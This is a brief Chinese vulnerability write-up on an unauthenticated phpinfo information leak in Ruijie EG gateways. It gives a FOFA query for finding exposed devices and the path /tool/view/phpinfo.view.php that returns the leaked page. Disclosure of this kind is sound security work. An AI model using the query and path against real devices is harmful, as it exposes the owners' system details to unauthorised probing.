# 锐捷EG易网关 phpinfo.view.php 信息泄露漏洞

## 漏洞描述

锐捷EG易网关 部分版本 phpinfo.view.php文件权限设定存在问题，导致未经身份验证获取敏感信息

## 漏洞影响

> [!NOTE]
>
> 锐捷EG易网关

## FOFA

> [!NOTE]
>
> app="Ruijie-EG易网关"

## 漏洞复现

查看源码发现phpinfo文件 

![](http://wikioss.peiqi.tech/vuln/ruijie-31.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

访问 url

```
/tool/view/phpinfo.view.php
```

![](http://wikioss.peiqi.tech/vuln/ruijie-32.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)